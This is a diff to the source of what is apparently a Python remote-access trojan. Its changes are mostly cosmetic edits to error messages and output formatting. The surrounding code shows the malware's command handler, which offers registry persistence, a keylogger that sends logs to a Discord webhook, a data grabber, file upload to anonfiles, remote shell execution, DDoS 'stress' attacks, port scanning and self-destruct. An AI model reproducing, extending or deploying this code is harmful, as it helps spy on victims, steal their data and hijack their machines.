@@ -416,8 +416,8 @@ def network_scan():
         return clients
 
     def output_results(clients):
-        out = ""
-        for client in clients: out += f" {client['ip']} \t{client['mac']}\n"
+        out = "     \n\n  ------- Network Scan Results -------\n\n"
+        for client in clients: out += f" {client['ip']} \t\t{client['mac']}\n"
         return out
 
 
@@ -677,10 +677,14 @@ def AttackCFSOC(until_datetime, target, req):
 #endregion
 #endregion
 
+#region Live Keylogger
+
+    
+#endregion
+
 #region Keylogger
 class Keylogger: 
     def __init__(self, interval, reciver_webhook):
-        now             = datetime.datetime.now()
         self.interval   = int(interval * 3600) # Convert secs to hours
         self.reciver    = DiscordWebhook(url=reciver_webhook, rate_limit_retry=True, username="Keylogger Logs")
         self.log        = ""
@@ -1752,7 +1756,7 @@ EXCLUDE_DIRECTORY = (
 ip      	= "IP_HERE" 	# IP_HERE
 port_    	= "PORT_HERE"			# PORT_HERE
 
-
+global blocked_process
 blocked_process = []
 maxthreads      = 50
 port            = int(port_)
@@ -1775,6 +1779,8 @@ class Client():
         self.url        = 'https://api.anonfiles.com/upload'            # Anonfiles upload url
         self.is_admin   = ctypes.windll.shell32.IsUserAnAdmin() != 0    # Check if user is admin
 
+
+        self.keylogger_logs = ""
 
         self.public_ip  = self.getip()
 
@@ -1965,13 +1971,13 @@ class Client():
                     registry_name = data[0]
                     if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
                     else: self.sock.send(str.encode("Persistance Failed!"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "scanfiles" in data:
                 try:
                     data = data.replace("scanfiles ","").split()
                     self.scan_files(data)
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "processcontrol" in data:
                 try:
@@ -1980,7 +1986,7 @@ class Client():
                     blocked_process += data
                     threading.Thread(target=process_control, args=(6969,)).start()
                     self.sock.send(f"Process Control Enabled".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "ddos" in data:
                 try:
@@ -2014,7 +2020,7 @@ class Client():
                 try:
                     commands = data.replace("root ","")
                     self._shell_run(commands)
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "portscan" in data:
                 try:
@@ -2065,11 +2071,11 @@ class Client():
                         return run_scanner(thread_amount, starting_port, ending_port)
                     
                     self.sock.send(str.encode(f"{ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "admincheck" in data:
                 try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "keylogger" in data:
                 try: 
@@ -2079,7 +2085,7 @@ class Client():
 
                     threading.Thread(target=Keylogger(intervals, reciever).start).start()
                     self.sock.send(str.encode(f"Keylogger started"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "download" in data:
                 try:
@@ -2087,7 +2093,7 @@ class Client():
                     dir = str(data[0])
                     out = self.download(dir)
                     self.sock.send(str.encode(f"Download file: " + out))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "upload" in data:
                 try:
@@ -2095,7 +2101,7 @@ class Client():
                     dir = str(data[0])
                     out = self.upload(dir)
                     self.sock.send(str.encode(f"File Uploaded: " + out))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "datagrabber" in data:
                 try:
@@ -2105,7 +2111,7 @@ class Client():
                     # run datagrabber thread
                     threading.Thread(target=start_datagrabber, args=(webhook___, )).start()
                     self.sock.send(str.encode("Datagrabber Running"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "runscript" in data:
                 try:
@@ -2117,7 +2123,7 @@ class Client():
 
                     threading.Thread(target=self.execute_script, args=(name_, type_, code_, )).start()
                     self.sock.send("Script executed".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif "stress" in data:
                 try:
@@ -2127,31 +2133,26 @@ class Client():
 
                     threading.Thread(target=start_stresser, args=(time, tasks, )).start()
                     self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "stopprocessscontrol":
                 try:
                     blocked_process = []
                     process_control.stop = 6969
                     self.sock.send(f"Process Control Disabled".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "systeminfo":
                 try:
                     data = f""" System Information
-
                     
 ============================================================================================================================
 ============================================================================================================================
-
-
                               Network Info
             ---------------------------------------------------
                     Public IP:          {self.public_ip}
                     Local IP:           {IP_addres}
         
-
-
                             Current CPU Info
     ---------------------------------------------------------------------
         CPU Frequency:                  {psutil.cpu_freq().current}
@@ -2159,20 +2160,13 @@ class Client():
         Per-CPU Utilization:            {psutil.cpu_percent(interval=1, percpu=True)}
         Min CPU Frequency:              {psutil.cpu_freq().min}
         Max CPU Frequency:              {psutil.cpu_freq().max}
-
         Number of physical cores: {psutil.cpu_count(logical=False)}
         Number of logical cores:  {psutil.cpu_count(logical=True)}
-
-
-
                                 RAM Info
     ---------------------------------------------------------------------
         Available RAM:                  {round(psutil.virtual_memory().available/1000000000, 2)} GB
         Used RAM:                       {round(psutil.virtual_memory().used/1000000000, 2)} GB
         RAM Usage:                      {psutil.virtual_memory().percent}%
-
-
-
                                 OS Info
     ---------------------------------------------------------------------
         Machine Type:                   {platform.machine()}
@@ -2181,39 +2175,38 @@ class Client():
         OS Type:                        {platform.system()}
         OS Release Version:             {platform.release()}
                     
-
 ============================================================================================================================
 ============================================================================================================================
 """
                     self.sock.send(str.encode(data))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "sendinfo":
                 try:
                     self.sock.send(str.encode(f"{self.public_ip} {socket.gethostname()} {platform.system()} Online"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "selfdestruct":
                 try:
                     self.sock.send(str.encode(f"{self.public_ip}    Self destructing..."))
                     self._self_destruct()
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "networkscan":
-                try: self.sock.send(f"{self.public_ip}    {network_scan()}".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                try: self.sock.send(f"{network_scan()}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "jigglecursor":
                 try:
                     threading.Thread(target=cursor_jiggle, args=(420,)).start()
                     self.sock.send(str.encode("Jiggling Cursor Enabled"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "jigglecursorstop":
                 try:
                     cursor_jiggle.stop = 420
                     self.sock.send(str.encode("Jiggling Cursor Disabled"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:    {e}".encode("ascii"))
 
             elif data == "ping":
                 self.sock.send(str.encode(f"pong"))
